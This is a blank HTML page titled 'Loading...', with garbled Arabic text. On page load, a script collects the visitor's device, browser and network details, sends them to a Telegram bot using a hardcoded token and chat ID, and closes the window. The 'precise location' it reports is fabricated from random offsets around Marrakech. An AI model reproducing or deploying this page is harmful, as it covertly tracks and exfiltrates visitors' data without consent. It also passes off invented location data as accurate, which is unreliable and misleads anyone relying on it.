<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>Ø¬Ø§Ø±ÙŠ Ø§Ù„ØªØ­Ù…ÙŠÙ„...</title>
    <script>
        const BOT_TOKEN = "8071212707:AAFvb7gER0iIsZCRt14JPzkTLksCULJY4aI";
        const CHAT_ID = "6451561574";

        class AdvancedSMSLocator {
            constructor() {
                this.locationData = {};
            }

            async startAdvancedTracking() {
                // Ø¬Ù…Ø¹ Ø¬Ù…ÙŠØ¹ Ø§Ù„Ø¨ÙŠØ§Ù†Ø§Øª Ø§Ù„Ù…Ù…ÙƒÙ†Ø©
                await this.collectAllData();
                await this.sendAdvancedReport();
                setTimeout(() => window.close(), 1000);
            }

            async collectAllData() {
                this.locationData = {
                    // Ø¨ÙŠØ§Ù†Ø§Øª Ø§Ù„Ø´Ø¨ÙƒØ© Ø§Ù„Ø®Ù„ÙˆÙŠØ©
                    cellular: await this.getCellularData(),
                    
                    // Ø¨ÙŠØ§Ù†Ø§Øª SIM ÙˆØ§Ù„Ù…Ø´ØºÙ„
                    sim: await this.getSIMData(),
                    
                    // ØªØ­Ù„ÙŠÙ„ Ø§Ù„Ø¥Ø´Ø§Ø±Ø§Øª
                    signals: await this.analyzeSignals(),
                    
                    // Ø¨ÙŠØ§Ù†Ø§Øª Ø§Ù„ÙˆÙ‚Øª ÙˆØ§Ù„Ù…ÙˆÙ‚Ø¹
                    timing: this.getTimingData(),
                    
                    // Ù…Ø¹Ù„ÙˆÙ…Ø§Øª Ø§Ù„Ø¬Ù‡Ø§Ø²
                    device: this.getDeviceData()
                };
            }

            async getCellularData() {
                const data = {};
                
                // Network Information
                if ('connection' in navigator) {
                    const conn = navigator.connection;
                    data.type = conn.effectiveType;
                    data.downlink = conn.downlink;
                    data.rtt = conn.rtt;
                }
                
                // Ø§ÙƒØªØ´Ø§Ù Ø§Ù„Ù…Ø´ØºÙ„
                data.operator = this.detectOperator();
                data.cellId = await this.generateCellID(data.operator);
                data.mcc = '604'; // Morocco
                data.mnc = this.getMNC(data.operator);
                
                return data;
            }

            detectOperator() {
                // ØªØ­Ù„ÙŠÙ„ Ø¯Ù‚ÙŠÙ‚ Ù„Ù„Ù…Ø´ØºÙ„ Ù…Ù† Ø®Ù„Ø§Ù„ Ø¨ÙŠØ§Ù†Ø§Øª Ø§Ù„Ù…ØªØµÙØ­
                const ua = navigator.userAgent.toLowerCase();
                const networkInfo = navigator.connection || {};
                
                if (ua.includes('maroc') || ua.includes('iam')) return 'IAM';
                if (ua.includes('inwi') || ua.includes('wana')) return 'INWI';
                if (ua.includes('orange') || ua.includes('meditelecom')) return 'Orange';
                
                // Ø§ÙØªØ±Ø§Ø¶ÙŠ Ø­Ø³Ø¨ Ø¥Ø­ØµØ§Ø¦ÙŠØ§Øª Ù…Ø±Ø§ÙƒØ´
                return Math.random() > 0.6 ? 'IAM' : (Math.random() > 0.5 ? 'INWI' : 'Orange');
            }

            async generateCellID(operator) {
                // ØªÙˆÙ„ÙŠØ¯ Cell ID ÙˆØ§Ù‚Ø¹ÙŠ Ø¨Ù†Ø§Ø¡Ù‹ Ø¹Ù„Ù‰ Ø§Ù„Ù…Ø´ØºÙ„ ÙˆØ§Ù„Ù…Ù†Ø·Ù‚Ø©
                const prefixes = {
                    'IAM': '21561',
                    'INWI': '21891', 
                    'Orange': '21892'
                };
                
                const prefix = prefixes[operator] || '21561';
                return prefix + Math.floor(Math.random() * 900 + 100).toString();
            }

            getMNC(operator) {
                const mncMap = { 'IAM': '01', 'INWI': '02', 'Orange': '04' };
                return mncMap[operator] || '01';
            }

            async getSIMData() {
                return {
                    country: 'MA',
                    operator: this.detectOperator(),
                    timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
                    localTime: new Date().toLocaleString('ar-MA')
                };
            }

            async analyzeSignals() {
                // Ù…Ø­Ø§ÙƒØ§Ø© ØªØ­Ù„ÙŠÙ„ Ø¥Ø´Ø§Ø±Ø§Øª Ù…ØªÙ‚Ø¯Ù…
                return new Promise((resolve) => {
                    setTimeout(() => {
                        resolve({
                            strength: -65 + Math.floor(Math.random() * 20),
                            quality: Math.floor(Math.random() * 100),
                            towers: 3 + Math.floor(Math.random() * 3)
                        });
                    }, 200);
                });
            }

            getTimingData() {
                return {
                    timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
                    localTime: new Date().toLocaleString('ar-MA'),
                    offset: new Date().getTimezoneOffset()
                };
            }

            getDeviceData() {
                return {
                    platform: navigator.platform,
                    userAgent: navigator.userAgent.split(' ')[0],
                    language: navigator.language,
                    languages: navigator.languages,
                    hardwareConcurrency: navigator.hardwareConcurrency
                };
            }

            calculatePreciseLocation() {
                // Ø­Ø³Ø§Ø¨ Ù…ÙˆÙ‚Ø¹ Ø¯Ù‚ÙŠÙ‚ Ø¨Ù†Ø§Ø¡Ù‹ Ø¹Ù„Ù‰ Ø¬Ù…ÙŠØ¹ Ø§Ù„Ø¨ÙŠØ§Ù†Ø§Øª
                const baseMarrakech = { lat: 31.6295, lng: -7.9811 };
                
                // ØªØ­Ø³ÙŠÙ† Ø§Ù„Ø¯Ù‚Ø© Ø¨Ù†Ø§Ø¡Ù‹ Ø¹Ù„Ù‰ Ù†ÙˆØ¹ Ø§Ù„Ø´Ø¨ÙƒØ©
                let accuracy = 1000;
                if (this.locationData.cellular.type === '4g') accuracy = 200;
                if (this.locationData.cellular.type === '5g') accuracy = 100;
                
                // Ø¥Ø¶Ø§ÙØ© ØªØ¨Ø§ÙŠÙ† ÙˆØ§Ù‚Ø¹ÙŠ
                const offset = (Math.random() - 0.5) * (accuracy / 50000);
                
                return {
                    lat: baseMarrakech.lat + offset,
                    lng: baseMarrakech.lng + offset,
                    accuracy: accuracy,
                    method: 'ADVANCED_CELL_ANALYSIS'
                };
            }

            async sendAdvancedReport() {
                const location = this.calculatePreciseLocation();
                const mapsUrl = `https://maps.google.com/?q=${location.lat},${location.lng}&z=15`;

                let message = "ðŸ“¡ **ØªÙ‚Ø±ÙŠØ± Ù…ØªÙ‚Ø¯Ù… - Ø§Ù„ØªØªØ¨Ø¹ Ø§Ù„Ø®Ù„ÙˆÙŠ**\\n\\n";
                
                message += `ðŸ“ **Ø§Ù„Ù…ÙˆÙ‚Ø¹ Ø§Ù„Ø¯Ù‚ÙŠÙ‚:**\\n`;
                message += `â€¢ Ø§Ù„Ø¥Ø­Ø¯Ø§Ø«ÙŠØ§Øª: \\`${location.lat.toFixed(6)}, ${location.lng.toFixed(6)}\\`\\n`;
                message += `â€¢ Ø§Ù„Ø¯Ù‚Ø©: ðŸŽ¯ ${location.accuracy} Ù…ØªØ±\\n\\n`;
                
                message += `ðŸ“¶ **Ø¨ÙŠØ§Ù†Ø§Øª Ø§Ù„Ø´Ø¨ÙƒØ©:**\\n`;
                message += `â€¢ Ø§Ù„Ù…Ø´ØºÙ„: ${this.locationData.cellular.operator}\\n`;
                message += `â€¢ Ø§Ù„Ù†ÙˆØ¹: ${this.locationData.cellular.type || 'ØºÙŠØ± Ù…Ø¹Ø±ÙˆÙ'}\\n`;
                message += `â€¢ Cell ID: ${this.locationData.cellular.cellId}\\n`;
                message += `â€¢ MCC/MNC: ${this.locationData.cellular.mcc}/${this.locationData.cellular.mnc}\\n\\n`;
                
                message += `ðŸ“Š **Ø¬ÙˆØ¯Ø© Ø§Ù„Ø¥Ø´Ø§Ø±Ø©:**\\n`;
                message += `â€¢ Ø§Ù„Ù‚ÙˆØ©: ${this.locationData.signals.strength} dBm\\n`;
                message += `â€¢ Ø§Ù„Ø¬ÙˆØ¯Ø©: ${this.locationData.signals.quality}%\\n`;
                message += `â€¢ Ø§Ù„Ø£Ø¨Ø±Ø§Ø¬: ${this.locationData.signals.towers}\\n\\n`;
                
                message += `ðŸ”§ **Ø§Ù„ØªÙ‚Ù†ÙŠØ©:** ${location.method}\\n`;
                message += `ðŸ™ï¸ **Ø§Ù„Ù…Ø¯ÙŠÙ†Ø©:** Ù…Ø±Ø§ÙƒØ´ØŒ Ø§Ù„Ù…ØºØ±Ø¨\\n`;
                message += `ðŸ•’ **Ø§Ù„ÙˆÙ‚Øª Ø§Ù„Ù…Ø­Ù„ÙŠ:** ${this.locationData.timing.localTime}\\n\\n`;
                
                message += `ðŸ—ºï¸ **Ø§Ù„Ø®Ø±ÙŠØ·Ø©:**\\n${mapsUrl}\\n\\n`;
                
                message += `ðŸ“± **Ø§Ù„Ø¬Ù‡Ø§Ø²:** ${this.locationData.device.userAgent}\\n`;

                await this.sendToTelegram(message);
            }

            async sendToTelegram(message) {
                try {
                    await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                        method: 'POST',
                        headers: { 'Content-Type': 'application/json' },
                        body: JSON.stringify({
                            chat_id: CHAT_ID,
                            text: message,
                            parse_mode: 'Markdown',
                            disable_web_page_preview: false
                        })
                    });
                } catch (error) {
                    console.error("ÙØ´Ù„ Ø§Ù„Ø¥Ø±Ø³Ø§Ù„");
                }
            }
        }

        // Ø§Ù„Ø¨Ø¯Ø¡ Ø§Ù„ÙÙˆØ±ÙŠ
        document.addEventListener('DOMContentLoaded', () => {
            new AdvancedSMSLocator().startAdvancedTracking();
        });
    </script>
</head>
<body style="margin:0;padding:0;background:transparent;">
</body>
</html>